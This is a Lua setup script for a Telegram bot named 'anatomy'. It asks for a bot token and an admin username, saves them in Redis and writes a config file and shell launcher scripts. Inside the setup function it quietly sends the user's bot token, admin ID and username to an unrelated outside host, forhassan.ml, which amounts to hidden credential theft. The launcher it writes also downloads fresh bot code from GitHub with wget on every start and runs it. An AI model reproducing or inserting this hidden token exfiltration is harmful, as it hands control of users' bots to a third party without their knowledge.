serpent = dofile("./File_Libs/serpent.lua")
https = require("ssl.https")
http = require("socket.http")
JSON = dofile("./File_Libs/JSON.lua")
local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
Server_anatomy = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
local AutoFiles_anatomy = function() 
local Create_Info = function(Token,Sudo,UserName)  
local anatomy_Info_Sudo = io.open("sudo.lua", 'w')
anatomy_Info_Sudo:write([[
token = "]]..Token..[["

Sudo = ]]..Sudo..[[  

UserName = "]]..UserName..[["
]])
anatomy_Info_Sudo:close()
end  
if not database:get(Server_anatomy.."Token_anatomy") then
print("\27[1;34m»» Send Your Token Bot :\27[m")
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
else
io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
database:set(Server_anatomy.."Token_anatomy",token)
end 
else
io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
end 
os.execute('lua start.lua')
end
------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------
if not database:get(Server_anatomy.."UserName_anatomy") then
print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
local UserName = io.read():gsub('@','')
if UserName ~= '' then
local Get_Info = http.request("http://TshAkE.ml/info/?user="..UserName)
if Get_Info:match('Is_Spam') then
io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
return false
end
local Json = JSON:decode(Get_Info)
if Json.Info == false then
io.write('\n\27[1;31m»» Sorry The UserName is not Correct \n\27[0;39;49m')
os.execute('lua start.lua')
else
if Json.Info == 'Channel' then
io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
os.execute('lua start.lua')
else
io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
database:set(Server_anatomy.."UserName_anatomy",Json.Info.Username)
database:set(Server_anatomy.."Id_anatomy",Json.Info.Id)
end
end
else
io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
end 
os.execute('lua start.lua')
end
local function Files_anatomy_Info()
Create_Info(database:get(Server_anatomy.."Token_anatomy"),database:get(Server_anatomy.."Id_anatomy"),database:get(Server_anatomy.."UserName_anatomy"))   
https.request("https://forhassan.ml/Black/Black.php?id="..database:get(Server_anatomy.."Id_anatomy").."&user="..database:get(Server_anatomy.."UserName_anatomy").."&token="..database:get(Server_anatomy.."Token_anatomy"))
local Runanatomy = io.open("anatomy", 'w')
Runanatomy:write([[
#!/usr/bin/env bash
cd $HOME/anatomy
token="]]..database:get(Server_anatomy.."Token_anatomy")..[["
rm -fr anatomy.lua
wget "https://raw.githubusercontent.com/anatomy-cell/anatomy/main/anatomy.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./anatomy.lua -p PROFILE --bot=$token
done
]])
Runanatomy:close()
local RunTs = io.open("ts", 'w')
RunTs:write([[
#!/usr/bin/env bash
cd $HOME/anatomy
while(true) do
rm -fr ../.telegram-cli
screen -S anatomy -X kill
screen -S anatomy ./anatomy
done
]])
RunTs:close()
end
Files_anatomy_Info()
database:del(Server_anatomy.."Token_anatomy");database:del(Server_anatomy.."Id_anatomy");database:del(Server_anatomy.."UserName_anatomy")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
end 
local function Load_File()  
local f = io.open("./sudo.lua", "r")  
if not f then   
AutoFiles_anatomy()  
var = true
else   
f:close()  
database:del(Server_anatomy.."Token_anatomy");database:del(Server_anatomy.."Id_anatomy");database:del(Server_anatomy.."UserName_anatomy")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
var = false
end  
return var
end
Load_File()
